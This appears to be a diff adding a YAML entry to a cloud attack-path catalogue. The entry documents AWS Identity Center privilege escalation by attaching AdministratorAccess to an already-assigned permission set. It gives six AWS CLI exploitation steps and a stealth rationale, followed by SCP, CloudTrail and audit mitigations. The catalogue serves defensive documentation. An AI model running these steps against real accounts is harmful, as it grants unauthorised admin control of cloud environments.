@@ -1,0 +1,143 @@
+id: sso-002
+name: sso:AttachManagedPolicyToPermissionSet
+category: self-escalation
+services:
+- sso-admin
+description: |
+  An attacker with `sso:AttachManagedPolicyToPermissionSet` can attach AdministratorAccess (or any high-privilege managed policy) to an existing permission set that is already assigned to them. This elevates the attacker's existing SSO access to admin without creating new assignments — making it less visible than creating entirely new permission sets and assignments.
+prerequisites:
+  admin:
+  - Attacker must already have an SSO assignment with a low-privilege permission set
+  - Attacker must have `sso:AttachManagedPolicyToPermissionSet` permission
+  - Must know the Identity Center instance ARN and the permission set ARN
+  lateral:
+  - Attacker must already have an SSO assignment with the target permission set
+  - Must have sso:AttachManagedPolicyToPermissionSet on the target permission set
+permissions:
+  required:
+  - permission: sso:AttachManagedPolicyToPermissionSet
+    resourceConstraints: Must have permission to attach managed policies to the target permission set ARN
+  additional:
+  - permission: sso:ListPermissionSets
+    resourceConstraints: Helpful for discovering permission sets the attacker is assigned to
+  - permission: sso:ListManagedPoliciesInPermissionSet
+    resourceConstraints: Useful for viewing current policies on the permission set
+  - permission: sso:ProvisionPermissionSet
+    resourceConstraints: May be needed to push changes to assigned accounts
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws sso-admin list-instances
+    description: Discover the Identity Center instance ARN
+  - step: 2
+    command: |
+      aws sso-admin list-permission-sets \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID
+    description: List permission sets to find the one already assigned to the attacker
+  - step: 3
+    command: |
+      aws sso-admin list-managed-policies-in-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID
+    description: View current policies on the target permission set (should be low-privilege)
+  - step: 4
+    command: |
+      aws sso-admin attach-managed-policy-to-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID \
+        --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+    description: Attach AdministratorAccess to the existing permission set
+  - step: 5
+    command: |
+      aws sso-admin provision-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID \
+        --target-type ALL_PROVISIONED_ACCOUNTS
+    description: Provision the permission set to push the policy change to all assigned accounts
+  - step: 6
+    command: echo "Log in to SSO portal - existing assignment now has admin access"
+    description: Access the account via SSO with the now-elevated permission set
+recommendation: |
+  Limit who can modify permission sets. Alert on `AttachManagedPolicyToPermissionSet` in CloudTrail.
+
+  SCP to restrict permission set modifications:
+  ```json
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+      {
+        "Effect": "Deny",
+        "Action": [
+          "sso:AttachManagedPolicyToPermissionSet",
+          "sso:DetachManagedPolicyFromPermissionSet",
+          "sso:PutInlinePolicyToPermissionSet",
+          "sso:DeleteInlinePolicyFromPermissionSet"
+        ],
+        "Resource": "*",
+        "Condition": {
+          "StringNotLike": {
+            "aws:PrincipalARN": "arn:aws:iam::*:role/SSOAdmin-BreakGlass"
+          }
+        }
+      }
+    ]
+  }
+  ```
+
+  Additional controls:
+  - **Monitor CloudTrail** — Alert immediately on `AttachManagedPolicyToPermissionSet` events, especially when AdministratorAccess or PowerUserAccess is being attached
+  - **Use provisioning pipelines** — Manage permission sets through IaC (Terraform/CloudFormation) and detect drift
+  - **Separate duty** — Principals assigned to permission sets should not have permissions to modify those same permission sets
+  - **Restrict managed policy ARNs** — Use SCPs with conditions to limit which managed policies can be attached
+  - **Regular audits** — Review permission set policies periodically to detect unauthorized additions
+limitations: |
+  This attack requires the attacker to already have an SSO assignment via the target permission set. The modification elevates the existing assignment rather than creating a new one, making it stealthier but also limiting it to accounts where the attacker already has some level of access.
+discoveryAttribution:
+  firstDocumented:
+    author: Paramanand Mallik
+    date: "2026"
+    link: https://github.com/DataDog/pathfinding.cloud/pull/XX
+references:
+- title: AWS Documentation - Managing Permission Sets
+  url: https://docs.aws.amazon.com/singlesignon/latest/userguide/permissionsetsconcept.html
+- title: AWS Documentation - IAM Identity Center API
+  url: https://docs.aws.amazon.com/singlesignon/latest/APIReference/API_AttachManagedPolicyToPermissionSet.html
+relatedPaths:
+- sso-001
+- sso-003
+attackVisualization:
+  nodes:
+  - id: attacker
+    label: SSO User (Low Privilege)
+    type: principal
+    description: |
+      An SSO user who already has an account assignment with a low-privilege permission set. The user also has `sso:AttachManagedPolicyToPermissionSet` permission.
+  - id: permission_set
+    label: Existing Permission Set
+    type: resource
+    description: |
+      The permission set already assigned to the attacker. Currently grants limited permissions (e.g., ReadOnlyAccess). The attacker will elevate it by attaching AdministratorAccess.
+  - id: admin_outcome
+    label: Full Admin via SSO
+    type: outcome
+    description: |
+      After attaching AdministratorAccess to the permission set and provisioning, the attacker's existing SSO access is elevated to full admin.
+  edges:
+  - from: attacker
+    to: permission_set
+    label: sso:AttachManagedPolicyToPermissionSet
+    description: |
+      Attach AdministratorAccess managed policy to the existing permission set.
+
+      Command:
+      ```bash
+      aws sso-admin attach-managed-policy-to-permission-set \
+        --instance-arn INSTANCE_ARN \
+        --permission-set-arn PERM_SET_ARN \
+        --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      ```
+  - from: permission_set
+    to: admin_outcome
+    label: Provisioned to assigned accounts
+    description: |
+      After provisioning, the permission set now includes AdministratorAccess. All existing account assignments using this permission set are elevated to admin.
